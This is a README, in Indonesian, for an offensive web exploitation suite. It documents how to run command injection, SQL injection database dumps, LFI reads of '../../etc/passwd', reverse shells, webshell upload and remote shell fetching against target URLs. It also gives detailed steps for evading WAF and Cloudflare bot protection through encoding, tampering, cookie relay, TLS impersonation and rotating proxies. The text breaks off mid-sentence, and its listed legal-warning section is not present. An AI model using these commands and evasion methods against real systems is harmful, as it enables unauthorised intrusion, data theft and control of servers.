# Zqrya-Exploit

```
▒███████▒  █████   ██▀███ ▓██   ██▓ ▄▄▄      ▓█████ ▒██   ██▒ ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▒ ▒ ▒ ▄▀░▒██▓  ██▒▓██ ▒ ██▒▒██  ██▒▒████▄    ▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
░ ▒ ▄▀▒░ ▒██▒  ██░▓██ ░▄█ ▒ ▒██ ██░▒██  ▀█▄  ▒███   ░░  █   ░▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
  ▄▀▒   ░░██  █▀ ░▒██▀▀█▄   ░ ▐██▓░░██▄▄▄▄██ ▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░
▒███████▒░▒███▒█▄ ░██▓ ▒██▒ ░ ██▒▓░ ▓█   ▓██▒░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░
░▒▒ ▓░▒░▒░░ ▒▒░ ▒ ░ ▒▓ ░▒▓░  ██▒▒▒  ▒▒   ▓▒█░░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░
░░▒ ▒ ░ ▒ ░ ▒░  ░   ░▒ ░ ▒░▓██ ░▒░   ▒   ▒▒ ░ ░ ░  ░░░   ░▒ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░
░ ░ ░ ░ ░   ░   ░   ░░   ░ ▒ ▒ ░░    ░   ▒      ░    ░    ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░
  ░ ░        ░       ░     ░ ░           ░  ░   ░  ░ ░    ░               ░  ░    ░ ░   ░
░                          ░ ░
```

> **All-in-One Web Exploitation Suite** — scanner + exploiter untuk pengujian
> keamanan web. Satu tool untuk **RCE / SQLi / XSS / SSTI / SSRF / LFI / XXE /
> open redirect / CORS / CRLF / request smuggling / blind OOB / recon /
> auto-exploit**, dengan dukungan **bypass WAF** dan **GUI desktop**.

<p align="center">
<img src="https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white&style=for-the-badge">
<img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-2ea44f?style=for-the-badge">
<img src="https://img.shields.io/badge/UI-CLI%20%2B%20GUI%20(Tkinter)-8B5CF6?style=for-the-badge">
<img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge">
<img src="https://img.shields.io/badge/Author-PiuPiuu-ec4899?style=for-the-badge">
<br>
<img src="https://img.shields.io/badge/Exploits-RCE%E2%80%A2SQLi%E2%80%A2XSS%E2%80%A2SSTI%E2%80%A2SSRF%E2%80%A2LFI%E2%80%A2XXE-e11d48?style=for-the-badge">
<img src="https://img.shields.io/badge/WAF%20Bypass-Encoding%20%2B%20Tamper%20%2B%20Impersonate-22d3ee?style=for-the-badge">
<img src="https://img.shields.io/badge/Tests-183%20passing-22c55e?style=for-the-badge">
<img src="https://img.shields.io/badge/Demo-Animated%20GIF-f97316?style=for-the-badge">
</p>

---

## Demo

![Zqrya-Exploit demo](https://raw.githubusercontent.com/webdev11-code/shell-injection/main/assets/demo.gif)

*Rekaman simulasi: mode WAF (`--waf`) menembus filtering, lalu RCE
`id; uname -a` dieksekusi pada parameter rentan.*

---

## Daftar Isi

1. [Fitur Utama](#fitur-utama)
2. [Instalasi](#instalasi)
3. [Mengunduh File Besar (Git LFS)](#mengunduh-file-besar-git-lfs)
4. [Dukungan Platform](#dukungan-platform)
5. [Antarmuka GUI](#antarmuka-gui)
6. [Antarmuka CLI](#antarmuka-cli)
7. [Mode Scan](#mode-scan)
8. [Cara Pakai — Contoh](#cara-pakai--contoh)
9. [Encoding Payload & Bypass WAF](#encoding-payload--bypass-waf)
10. [Mesin Exploit Vendored](#mesin-exploit-vendored)
11. [Recon: subdomain → crawl → scan → exploit](#recon-subdomain--crawl--scan--exploit)
12. [Blind / OOB (DNS & HTTP exfiltration)](#blind--oob-dns--http-exfiltration)
13. [Reverse Shell & Web Shell](#reverse-shell--web-shell)
14. [SQL Injection Dump](#sql-injection-dump)
15. [Laporan Hasil Scan](#laporan-hasil-scan)
16. [Sumber Payload](#sumber-payload)
17. [Struktur Folder](#struktur-folder)
18. [Testing](#testing)
19. [Peringatan Hukum](#peringatan-hukum)
20. [Status Pengembangan](#status-pengembangan)

---

## Fitur Utama

| Kategori | Kemampuan |
|---|---|
| 🔴 **Command Injection / RCE** | chaining (`;` `\|` `&&` `\n`), `$()`/backtick, bypass spasi (`${IFS}`), bypass keyword, time-based, eksekusi command (`--exec`), shell interaktif (`--shell`) |
| 🔵 **SQL Injection** | error-based (17 tanda error DB), boolean-based, time-based (`SLEEP`/`WAITFOR`/`pg_sleep`), versi DB (extractvalue/updatexml), **dump penuh** UNION + blind |
| 🟣 **XSS / SSTI** | reflected XSS (marker acak), template injection (`{{7*7}}`, `${7*7}`, `<%= %>`) |
| 🟠 **SSRF / XXE / LFI / RFI** | callback OOB, entity eksternal, `../../etc/passwd`, `php://filter`, `proc/self/environ`, `win.ini` |
| 🟡 **Infra/Web** | open directory listing, open redirect, CORS misconfig, CRLF header injection, HTTP request smuggling (CL.TE/TE.CL/TE.TE), file sensitif (`/.env`, `/.git/config`, `phpinfo.php`, actuator) |
| 🛡️ **Bypass WAF** | `--waf` (fingerprint WAF/CDN + `--encode auto` × `--tamper all` + spoof IP), `--waf-headers` (override path/method + rotasi XFF), tamper (`hpp`/`whitespace`/`ifsvars`), impersonasi TLS (`--impersonate`), proxy, cookie relay, payload obfuscation (glob/printf/here-string/base64) |
| 🧭 **Recon & Auto** | subdomain enumeration (crt.sh + brute DNS), crawling form/link, `--crawler` pipeline, `--auto` penuh, `--all-in-one` (semua modul + auto-exploit), auto-exploit |
| 🎯 **Blind / OOB** | listener HTTP + DNS lokal, mode collaborator (`--oob-domain`), payload `nslookup`/`dig`/`curl`/`wget` |
| 💻 **Shell** | reverse shell (bash/nc/python/perl/php/ruby/socat/awk), PHP webshell upload, fetch shell remote |
| 📦 **Mesin Tools** | `zq-radar` (mass scan), `zq-fuzzer` (dirscan), `zq-hunter` (subdomain), `zyra-sqli` (SQLi full) — semuanya di-launch dari sini |
| 🟢 **Coverage ala xray** | `baseline` (header keamanan + TLS), `jsonp`, `upload`, `brute-force` (weak password), `fingerprint` (web tech), backup/config file |
| ⚔️ **Deteksi Framework** | `struts` (S2-045/S2-057/S2-032), `thinkphp` (RCE), `shiro` (rememberMe), `fastjson` (autoType), `log4shell` (Log4j), `cve` (Confluence/Weblogic/Jenkins/GitLab) |
| 🎛️ **Plugin Selector** | `--plugins xss,sqldet,cmd-injection` pilih subset modul (ala `xray --plugins`), `--plugins-list` untuk daftar |
| 🔀 **Passive Proxy** | `--listen 127.0.0.1:7777` analisis traffic browser (ala `xray webscan --listen`), tombol GUI "Passive Proxy" |
| 🧩 **Custom PoC** | engine PoC JSON/YAML (`--poc`) ala xray `phantasm` |
| 📄 **Laporan** | output `.html` / `.json` / `.txt`, save report di GUI |

---

## Instalasi

### Persyaratan

| Kebutuhan | Keterangan |
|---|---|
| Python | **3.8+** ([python.org](https://python.org), centang *Add to PATH* di Windows) |
| `git` | untuk `git clone` (atau unduh ZIP dari GitHub) |
| `pip` + `venv` | **disarankan** — bawaan Python, untuk install & isolasi dependensi |
| `requests` | dependency satu-satunya; otomatis terpasang saat `pip install .` |
| Tkinter | **opsional** — untuk GUI (Linux: `sudo apt install python3-tk`) |
| `curl_cffi` | **opsional** — untuk `--impersonate` |
| `cryptography` | **opsional** — untuk HTTPS MITM pada passive proxy (`--mitm`) |
| `PyYAML` | **opsional** — untuk file PoC `.yaml`/`.yml` (format PoC YAML) |
| `nmap` / `netcat-openbsd` | **opsional** — mesin Go & listener `nc` (Linux) |

### Instalasi cepat (disarankan — venv, Windows & Linux)

Cara ini memakai **virtualenv** agar tidak mengotori Python sistem dan lolos
blokir PEP 668 (`externally-managed-environment`) di distro baru:

```bash
git clone https://github.com/webdev11-code/shell-injection
cd shell-injection

# buat & aktifkan virtualenv
python3 -m venv venv                 # Windows: python -m venv venv
source venv/bin/activate             # Windows: venv\Scripts\activate

# install (package + launcher `zqrya`)
python -m pip install --upgrade pip
python -m pip install .

# (opsional) fitur tambahan: impersonate, MITM, PoC YAML
python -m pip install curl_cffi cryptography PyYAML
```

> Setelah ini, panggil tool cukup dengan `zqrya ...` (launcher terpasang di
> `venv/Scripts` atau `venv/bin`).

### Windows (detail)

1. **Python 3.8+**: unduh dari [python.org](https://python.org) dan **CENTANG**
   *“Add python.exe to PATH”*, atau via winget:
   ```powershell
   winget install Python.Python.3.12
   ```
2. **Clone & install**:
   ```powershell
   git clone https://github.com/webdev11-code/shell-injection
   cd shell-injection
   python -m pip install .            # install package + launcher `zqrya.exe`
   ```
3. **(opsional) mesin Go (radar/fuzzer/hunter) via Git LFS**:
   ```powershell
   python zqrya.py --cli --fetch-tools
   ```

- Launcher otomatis jadi `zqrya.exe` (dipanggil dari mana saja bila PATH benar).
- Tanpa `nc`? Listener Python bawaan dipakai otomatis.
- `zq-radar` (file LFS) **tidak wajib** — Windows otomatis memakai fallback native Python.
- Mesin SQLi `zyra-sqli` jalan penuh (launcher `tools/bin/zq-dbstrike.py`).

### Linux (detail)

```bash
# 1. Python 3.8+ + Tkinter (GUI; tanpa tkinter tetap jalan mode CLI)
#    Debian/Ubuntu:
sudo apt install -y python3 python3-pip python3-venv python3-tk git
#    Fedora:
#    sudo dnf install -y python3 python3-pip python3-tkinter git
#    Arch/Manjaro:
#    sudo pacman -S --needed python python-pip tk git
#    openSUSE:
#    sudo zypper install python3 python3-pip python3-tk git

# 2. Clone repo
git clone https://github.com/webdev11-code/shell-injection
cd shell-injection

# 3. (disarankan) virtualenv
python3 -m venv venv
source venv/bin/activate

# 4. Install
python3 -m pip install --upgrade pip
python3 -m pip install .

# 5. (opsional) dependensi tambahan
python3 -m pip install curl_cffi cryptography PyYAML

# 6. (opsional) untuk mesin Go & listener nc
sudo apt install -y nmap netcat-openbsd

# 7. (opsional) untuk mesin radar asli (±138 MB, file Git LFS)
python zqrya.py --cli --fetch-tools
```

> Ubuntu 23.04+/Debian 12 memblokir `pip install` ke sistem (PEP 668). Solusi:
> pakai **venv** di atas, atau tambah flag `--break-system-packages` bila
> memang ingin install global.

### Tanpa install (jalankan langsung dari source)

```bash
git clone https://github.com/webdev11-code/shell-injection
cd shell-injection
python3 -m pip install -r requirements.txt   # hanya 'requests'

python3 zqrya.py --cli --tools               # via shim
python3 -m zqrya_exploit --cli --tools       # via module
```

### Verifikasi

```bash
zqrya --cli --tools                          # cek mesin terpasang (radar/fuzzer/hunter/zyra-sqli)
zqrya --cli https://target.com --crawler -o report.html
python -m zqrya_exploit --cli --tools        # alternatif via module
python zqrya.py --cli --tools                # alternatif dari source checkout
```

### Troubleshooting

| Gejala | Solusi |
|---|---|
| `zqrya` tidak dikenali | PATH Python belum benar / venv belum aktif → pakai `python -m zqrya_exploit` |
| `externally-managed-environment` | pakai venv, atau `pip install . --break-system-packages` |
| `ModuleNotFoundError: requests` | `pip install -r requirements.txt` |
| GUI tidak muncul | tkinter belum terpasang / tidak ada display → otomatis fallback CLI (`--cli`) |
| `--impersonate` tidak jalan | `pip install curl_cffi` |
| `--mitm` tidak jalan | `pip install cryptography` |
| Radar keluar kosong | templates belum ada → `zqrya --update-templates` / `--fetch-tools` |

> Tanpa `tkinter`, GUI otomatis fallback ke mode CLI. Bisa juga dipaksa CLI
> dengan flag `--cli`.

---

## Mengunduh File Besar (Git LFS)

`zq-radar` (±138 MB) disimpan via **Git LFS** — saat `git clone` Anda mendapat
*pointer*, bukan binary-nya. Unduh dengan salah satu cara:

```bash
# Cara 1 (CLI): tool mengunduh otomatis (pakai git-lfs, atau LFS batch API murni urllib)
python zqrya.py --cli --fetch-tools

# Cara 2: manual
git lfs pull

# Cek status: mesin yang belum punya file akan ditandai "[LFS]"
python zqrya.py --cli --tools
```

- **GUI**: tombol **"Fetch Tools (LFS)"** di panel *Mesin Tools* melakukan unduhan yang sama.
- Kalau mesin yang belum diunduh tetap dipakai (`--radar` / tombol GUI), tool
  menampilkan peringatan dan meminta `--fetch-tools` dulu.
- Windows **tidak memerlukan** `zq-radar` (fallback Python dipakai otomatis).
- `zq-radar` (nuclei) **butuh templates** agar bisa scan apa pun — tanpa templates ia
  keluar kosong tanpa mengirim request. Sebanyak **66 templates kurasi sudah dibundel**
  (`tools/radar-templates/`: `cves/` critical CVE, `exposures/` file sensitif,
  `misconfiguration/`, `admin-panels/`, `cms/`, `technologies/` fingerprint web server /
  framework / JS library) jadi Radar langsung jalan out-of-the-box.
  Tool mencari templates dengan urutan: `RADAR_TEMPLATES`/`NUCLEI_TEMPLATES`,
  `~/.config/radar/templates`, `~/radar-templates`, lalu bundel bawaan; bila tetap tidak
  ada, otomatis **fallback ke scanner Python bawaan** (bukan no-op).

- **Auto-download templates penuh** (13k+ template nuclei-templates resmi) ke
  `~/radar-templates` — dari CLI atau GUI tanpa install git:

  ```bash
  zqrya --update-templates                     # unduh penuh ke ~/radar-templates
  zqrya --radar https://target.com/            # lalu scan massal pakai set penuh
  ```

  Prioritas: updater bawaan `zq-radar -update-templates -update-template-dir ~/radar-templates`;
  kalau gagal, **fallback tarball GitHub** (`urllib` + `tarfile`, murni stdlib). Di GUI, tombol
  **"Download Templates"** di panel *Mesin Tools* menjalankan hal yang sama.

  Setelah unduh, **66 template kurasi bawaan otomatis di-merge** ke subfolder
  `~/radar-templates/zqrya-bundled/` (idempotent — file yang sudah sinkron tidak
  disalin ulang), sehingga satu `-t ~/radar-templates` mencakup set penuh nuclei
  **plus** deteksi kustom Zqrya sekaligus.

---

## Dukungan Platform

| Aspek | Windows | Linux |
|---|---|---|
| CLI | ✅ | ✅ |
| GUI (Tkinter) | ✅ (bawaan Python) | ✅ (`python3-tk`) |
| Mesin `zyra-sqli` (SQLi full) | ✅ launcher Python | ✅ |
| Mesin Go (`radar`/`fuzzer`/`hunter`) | ⚠️ fallback native Python | ✅ binary asli |
| Listener `nc` | ⚠️ fallback listener Python | ✅ (jika `netcat` terpasang) |
| Banner & log UTF-8 | ✅ (`_fix_console()` + ANSI VT) | ✅ |

> Banner di terminal berwarna **gradasi** (merah → kuning) dan log berwarna
> per-tingkat: `[*]` cyan (info), `[+]` hijau (sukses), `[-]` merah (gagal),
> `[!]` kuning (peringatan), `[VULN]` merah tebal, label `>>` magenta, URL disorot.
> Warna otomatis dimatikan saat output dipipe / `NO_COLOR` di-set.

---

## Antarmuka GUI

```bash
python zqrya.py          # tanpa --cli → GUI
```

| Area | Fungsi |
|---|---|
| **Ganti URL (Modal)** | masukkan target, mis. `http://target.com/index.php?cmd=id` |
| **Scan Shell Injection** | uji semua query parameter dengan payload RCE (echo marker + time-based) |
| **Scan Directory / Traversal** | cek open listing + path traversal ke file sensitif |
| **Run Command (Inject)** | cari parameter rentan lalu eksekusi command berulang via dialog |
| **All-in-One (Full)** | jalankan semuanya sekaligus: crawl → semua mode deteksi → framework/CVE → PoC → directory → auto-exploit RCE (setiap modul terisolasi, dengan **progress bar** + persentase per langkah) |
| **CVE Exploit (RCE)** | dialog pilih CVE (Struts2/ThinkPHP/F5/Ivanti/phpUnit) + **command** atau **reverse shell** (tipe bash/python/nc/… + LHOST/LPORT) → ambil output command / luncurkan shell (setara `--exploit` + `--rshell`) |
| **SQLi Dump** | dump database penuh dari parameter SQL rentan |
| **WAF/CDN Fingerprint** | deteksi WAF/CDN (Cloudflare, Akamai, AWS CloudFront/ALB, Fastly, Sucuri, Imperva, F5, ModSecurity, dst.) + saran bypass |
| **Mode** (dropdown) | all / all-in-one / injection / sqli / ssti / ssrf / xss / lfi / xxe / redirect / headers / smuggling / directory / oob / recon / waf |
| **Encoding** (dropdown) | none / url / double-url / hex / double-hex / auto |
| **WAF** (checkbox) | aktifkan mode WAF (auto-encode + tamper all) + spoof IP internal + otomatis fingerprint WAF/CDN target |
| **Header Bypass** (checkbox) | tambah override path/method (`X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`) + rotasi `X-Forwarded-For` |
| **Tamper** (dropdown) | none / hpp / whitespace / ifsvars / all |
| **Impersonate** (dropdown) | chrome / edge / safari / firefox (butuh `curl_cffi`) |
| **Proxy / Cookie** (field) | route via proxy; kirim cookie mentah (mis. `cf_clearance=...`) |
| **Advanced** (panel) | **OOB Domain** (collaborator untuk shiro/fastjson/log4shell/frameworks) + **Auto-exploit CVE** (jalankan `id` otomatis setelah RCE ketemu) + **Debug HTTP** (log tiap request/response ke panel) |
| **Mesin Tools** | Hunter, Radar, Fuzzer, SQLi Full (zyra-sqli), Reverse Shell, Web Shell, Update Payloads, **Fetch Tools (LFS)**, **Download Templates** — output di-stream **live** ke panel (bukan buffered sampai selesai). Tombol **Radar** membuka dialog pilih **kategori (folder) + severity + tags** (filter template nuclei) |
| **Wordlist** | pilih file wordlist custom untuk fuzz directory |
| **Save Report** | simpan hasil sebagai `.html` / `.json` / `.txt` |
| **Stop** | hentikan tool eksternal (radar/fuzzer/hunter/dbstrike) yang sedang berjalan — aktif hanya saat ada proses |

---

## Antarmuka CLI

```bash
zqrya --cli [URL] [opsi...]
```

### Referensi opsi lengkap

| Opsi | Fungsi |
|---|---|
| `URL` | URL target (mis. `http://localhost/vuln.php?cmd=id`) |
| `--mode MODE` | jenis scan — lihat [Mode Scan](#mode-scan) (default: `all`) |
| `--exec CMD` | eksekusi satu command pada parameter rentan |
| `--shell` | buka shell interaktif pada parameter rentan |
| `--param NAME` | nama parameter target (`--exec`/`--shell`/`--rshell`/`--webshell`) |
| `--exploit CVE_ID` | exploit CVE RCE (ambil output command via framework/appliance); daftar: `--exploit-list` |
| `--rce-command CMD` | command untuk `--exploit` (default `id; uname -a; hostname`) |
| `--exploit-list` | tampilkan daftar CVE RCE yang bisa di-exploit |
| `--encode MODE` | `none` / `url` / `double-url` / `hex` / `double-hex` / `auto` (default `none`) |
| `--waf` | mode WAF: fingerprint WAF/CDN + saran bypass, lalu `--encode auto` × `--tamper all` + header bypass IP internal (spoof `X-Forwarded-For` dll.) |
| `--waf-headers` | header bypass agresif: tambah `X-Original-URL` / `X-Rewrite-URL` / `X-HTTP-Method-Override` + rotasi `X-Forwarded-For` antar IP internal |
| `--tamper T` | `none` / `hpp` / `whitespace` / `ifsvars` / `all` — ditumpuk dengan `--encode` |
| `--impersonate B` | `chrome` / `chrome110` / `chrome131` / `edge` / `safari` / `firefox` (butuh `curl_cffi`) |
| `--proxy URL` | route semua request via proxy (mis. Burp) |
| `--cookie STR` | kirim cookie mentah (solusi challenge Cloudflare) |
| `--rshell [TYPE]` | luncurkan reverse shell (default `bash`; daftar: `--rshell-list`) |
| `--lhost IP` / `--lport P` | LHOST/LPORT reverse shell (default port 4444) |
| `--rshell-list` | tampilkan daftar tipe reverse shell |
| `--listen HOST:PORT` | proxy pasif ala xray: `--listen 127.0.0.1:7777`; angka saja (`--listen 4444`) tetap buka listener reverse shell |
| `--mitm` | aktifkan HTTPS MITM pada proxy pasif (dekripsi https via CA lokal, butuh `cryptography`) |
| `--webshell` | tulis PHP webshell inline ke target |
| `--fetch-shell URL` | unduh shell dari URL lalu tulis ke target |
| `--webshell-path PATH` | path tujuan webshell di target |
| `--webshell-url URL` | URL akses webshell (hanya dicetak) |
| `--oob-host` / `--oob-port` / `--oob-dns-port` | listener OOB lokal (HTTP/DNS) |
| `--oob-type T` | `http` / `dns` / `both` (default `both`) |
| `--oob-wait DETIK` | lama menunggu callback (default 15) |
| `--oob-domain DOMAIN` | mode collaborator manual (interactsh / Burp Collaborator) |
| `--auto-exploit` | mode recon: exploit otomatis param yang terbukti rentan |
| `--auto-exploit-cve` | setelah `--mode cve`/`frameworks`/`struts`/`thinkphp` menemukan RCE, langsung jalankan `id` dan ambil outputnya |
| `--crawler` | pipeline lengkap: subdomain + crawl + scan semua payload + inject |
| `--auto` | otomatis penuh: recon + semua vuln + exploit + SQLi dump |
| `--all-in-one` | pipeline all-in-one lengkap (crawl → semua deteksi → framework/CVE → PoC → directory → auto-exploit RCE); sama dengan `--mode all-in-one` |
| `--sqli-dump` | dump database (databases → tables → columns → data) |
| `--sqli-query SQL` | jalankan query SQL arbitrer via UNION |
| `--ssrf-host` / `--ssrf-port` | listener SSRF (default port 8080) |
| `--update-payloads` | unduh payload PayloadsAllTheThings ke `./payloads/` |
| `--threads N` | thread paralel (default 20) |
| `--tools` | daftar mesin tool terpasang lalu keluar |
| `--fetch-tools` | unduh file LFS yang diperlukan mesin tool |
| `--radar` | jalankan mesin radar (deteksi massal) |
| `--radar-categories LIST` | filter kategori template radar — bundel (`cves,exposures,misconfig,admin,cms,tech`) atau full nuclei (`http/cves,dns,ssl,network,file,code,javascript,dll.`) |
| `--radar-severity LIST` | filter severity radar (default `low,medium,high,critical`) |
| `--radar-tags LIST` / `--radar-exclude-tags LIST` | filter / exclude tags radar |
| `--dbstrike` | jalankan mesin dbstrike = zyra-sqli (SQLi full) |
| `--fuzzer` | jalankan mesin fuzzer (dirscan) |
| `--hunter` | jalankan mesin hunter (subdomain) |
| `--tool-args "..."` | argumen tambahan yang diteruskan ke mesin tool |
| `--subdomain-wordlist FILE` | wordlist brute subdomain |
| `--max-pages N` / `--max-depth N` / `--delay DETIK` | kendali crawler (default 100/3/0.1) |
| `--wordlist FILE` | wordlist directory scan |
| `--plugins LIST` | pilih subset modul deteksi (ala xray): `--plugins xss,sqldet,cmd-injection` |
| `--plugins-list` | tampilkan daftar plugin deteksi lalu keluar |
| `--poc FILE/DIR` | jalankan PoC kustom (JSON/YAML) pada target |
| `--users FILE` / `--passwords FILE` | wordlist username/password untuk `--mode brute-force` |
| `-o FILE` | simpan laporan (`.txt` / `.json` / `.html`) |
| `--debug-http` | verbose: cetak tiap request/response HTTP (`[HTTP] >> GET ...`, `[HTTP] << 200 ...`) ke log |

---

## Mode Scan

| Mode | Keterangan |
|---|---|
| `injection` | command injection (RCE) — payload `;`, `\|`, `$()`, backtick, bypass spasi/keyword, time-based |
| `sqli` | SQL injection — error/boolean/time-based |
| `xss` | reflected XSS dengan marker acak |
| `ssti` | server-side template injection |
| `ssrf` | server-side request forgery (callback OOB) |
| `lfi` | local/remote file inclusion (`../../etc/passwd`, `php://filter`) |
| `xxe` | XXE entity external → callback OOB |
| `redirect` | open redirect via header `Location` |
| `headers` | CORS misconfig + CRLF header injection |
| `smuggling` | HTTP request smuggling (CL.TE / TE.CL / TE.TE) |
| `directory` | open directory listing + path traversal |
| `oob` | blind command injection via callback out-of-band |
| `recon` | subdomain enumeration + crawl + scan |
| `baseline` | cek header keamanan hilang + versi TLS lemah / non-HTTPS |
| `jsonp` | deteksi endpoint JSONP yang callback-nya bisa dibaca lintas-origin |
| `upload` | deteksi endpoint upload (PUT + multipart) yang menerima file |
| `brute-force` | weak password via HTTP Basic Auth + form login sederhana |
| `fingerprint` | identifikasi teknologi/framework target |
| `waf` | fingerprint WAF/CDN (Cloudflare/Akamai/AWS/Fastly/ModSecurity/dst.) + saran bypass |
| `poc` | jalankan PoC kustom (JSON/YAML) dari `--poc` |
| `passive` | proxy pasif (analisis traffic browser), shorthand `--listen` |
| `struts` | deteksi Struts2 (S2-045 Content-Type OGNL RCE, S2-057/S2-016 OGNL eval) |
| `thinkphp` | deteksi ThinkPHP RCE (invokefunction / CVE-2018-20062) |
| `shiro` | deteksi Apache Shiro (rememberMe fingerprint + brute-force AES key via gadget URLDNS OOB) |
| `fastjson` | deteksi Fastjson autoType (HTTP OOB lokal / DNS collaborator) |
| `frameworks` | gabungan semua deteksi framework di atas |
| `log4shell` | deteksi Log4Shell (CVE-2021-44228) via JNDI DNS callback (`--oob-domain`) |
| `cve` | deteksi **critical CVE** (Weblogic/Jenkins/Confluence/GitLab + F5/Citrix/Apache/Ivanti/Grafana/Laravel/phpUnit/PaperCut/Telerik/Solr/Zimbra/Spring4Shell/MOVEit/Exchange/OFBiz/ColdFusion/vCenter) |
| `all-in-one` | pipeline lengkap: crawl → semua deteksi → framework/CVE → PoC → directory → auto-exploit RCE (setara tombol **All-in-One (Full)** di GUI) |
| `all` | **default** — semua mode di atas |

---

## Cara Pakai — Contoh

### Scan cepat semua kerentanan

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --mode all
```

### Pipeline satu perintah

```bash
# subdomain + crawl + scan semua payload (semua encoding) + auto-inject
zqrya --cli https://target.com --crawler -o target.html
```

`--crawler` = `--mode recon --encode auto --auto-exploit`.

### Scan per jenis

```bash
zqrya --cli http://localhost/ --mode directory --threads 50
zqrya --cli http://localhost/ --mode directory --wordlist wordlist.txt
zqrya --cli http://localhost/vuln.php?cmd=id --mode injection --encode double-url
```

### Eksekusi command & shell interaktif

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --exec "id; uname -a"
zqrya --cli http://localhost/vuln.php --shell
zqrya --cli http://localhost/vuln.php --shell --param cmd
```

### Automasi penuh

```bash
zqrya --cli https://target.com --auto -o report.html

# All-in-One: crawl -> semua deteksi -> framework/CVE -> PoC -> directory -> auto-exploit RCE
zqrya --cli https://target.com --all-in-one -o report.html
zqrya --cli https://target.com --mode all-in-one -o report.html
```

---

## Encoding Payload & Bypass WAF

### Mode encoding (`--encode`)

| Mode | Keterangan |
|---|---|
| `none` | plain (default) |
| `url` | percent-encode karakter khusus (`%3B%20...`) |
| `double-url` | percent-encode dua kali (`%253B%2520...`) |
| `hex` | encode tiap byte termasuk huruf/angka (`%3b%20%65...`) |
| `double-hex` | hex lalu di-url-encode lagi |
| `auto` | coba semua mode untuk tiap payload |

```bash
zqrya --cli http://localhost/vuln.php?cmd=id --encode hex --exec "id"
zqrya --cli http://localhost/vuln.php?cmd=id --encode auto --mode injection
```

Selain encoding transport, exploit juga mencoba command yang di-hex-encode
(`printf <hex> \| xxd -r -p \| sh`, `bash -c $'\x..'`) untuk bypass filter
karakter pada command.

### Fingerprint WAF/CDN (`--mode waf`)

Deteksi WAF/CDN di depan target dari header respons & body, lalu cetak saran
bypass yang relevan:

```bash
zqrya --cli https://target/ --mode waf
```

Output contoh (Cloudflare):
```
[*] Fingerprint WAF/CDN pada https://target/ ...
    [WAF/CDN] Cloudflare (CDN/WAF)
        -> challenge (Just a moment): selesaikan di browser lalu teruskan cookie via --cookie cf_clearance=...
        -> --impersonate chrome agar TLS/HTTP2 fingerprint mirip browser
        -> pakai --proxy residential bila IP kamu ter-flag
    [Header] Server: cloudflare
    [Header] CF-Ray: abc123
```

25+ signature dikenali: Cloudflare, Akamai, AWS CloudFront/ALB, Fastly, Sucuri,
Imperva/Incapsula, F5 BIG-IP, ModSecurity, FortiWeb, Barracuda, Citrix NetScaler,
Radware, Wallarm, Varnish, StackPath, KeyCDN, BunnyCDN, CDN77, G-Core, Azure
Front Door, Alibaba/Tengine, Tencent, Baidu Yunjiasu, SafeDog. Di GUI tersedia
tombol **WAF/CDN Fingerprint**; mencentang **Mode WAF** otomatis menjalankannya.

### Mode WAF (`--waf`)

Bila target ada di belakang WAF (banyak respons `403`), aktifkan `--waf`
(fingerprint WAF/CDN + `--encode auto` × `--tamper all` + spoof IP internal +
varian bypass keyword `e''c''h''o`, backslash-escape, `${IFS}`, separator
non-`;` — newline/CRLF/tab):

```bash
# Deteksi + exploit menembus WAF (klasik: WAF single-decode, aplikasi double-decode)
zqrya --cli http://target/?cmd=id --mode injection --waf
zqrya --cli http://target/?cmd=id --exec "id; uname -a" --waf
```

Saat deteksi gagal, tool mencetak peringatan *"kemungkinan diblokir WAF"* dan
menyarankan `--waf`. Contoh bypass terverifikasi: WAF memblokir `;|&`, backtick,
`$()`, karakter kontrol, dan keyword command — ditembus via `--encode url`
(double-encode di wire → WAF hanya decode sekali, aplikasi double-decode menerima
payload asli).

### Cloudflare & AWS WAF (`--impersonate`, `--proxy`, `--cookie`)

WAF ketat punya dua lapis: **rules engine** (menormalisasi & meng-decode URL) dan
**bot detection** (TLS/JA3 + HTTP/2 fingerprint, challenge).

| Opsi | Kegunaan |
|---|---|
| `--waf` | bypass rules engine: auto-coba encoding + payload obfuscation |
| `--impersonate BROWSER` | impersonasi TLS/HTTP2 ala browser (butuh `pip install curl_cffi`) — lawan bot-detection Cloudflare / AWS Bot Control |
| `--proxy URL` | route semua request via proxy (Burp / rotating) untuk ganti IP & inspeksi |
| `--cookie "cf_clearance=..."` | teruskan cookie browser — solusi challenge Cloudflare (selesaikan challenge di browser → salin cookie → jalankan tool) |

```bash
pip install curl_cffi   # sekali, untuk --impersonate

# Deteksi + RCE menembus Cloudflare-class WAF
zqrya --cli https://target/?cmd=id --waf --impersonate chrome \
      --proxy http://127.0.0.1:8080
zqrya --cli https://target/?cmd=id --exec "id; uname -a" \
      --waf --impersonate chrome --cookie "cf_clearance=abc123"
```

### Tamper payload (`--tamper`)

Untuk WAF rules-engine yang lolos dari variasi encoding saja — **ditumpuk**
dengan `--encode` (auto-coba kombinasi encode × tamper):

| Tamper | Cara |
|---|---|
| `hpp` | HTTP Parameter Pollution: `?cmd=SAFE&cmd=PAYLOAD` — banyak WAF hanya cek kemunculan pertama, aplikasi (mis. PHP) pakai nilai terakhir |
| `whitespace` | ganti spasi dengan TAB (whitespace valid di shell) |
| `ifsvars` | ganti spasi dengan `${IFS}` (variabel Internal Field Separator shell) |
| `all` | coba none, whitespace, ifsvars, dan hpp untuk tiap payload |

Payload bawaan juga diperkuat dengan bypass keyword/karakter non-echo:
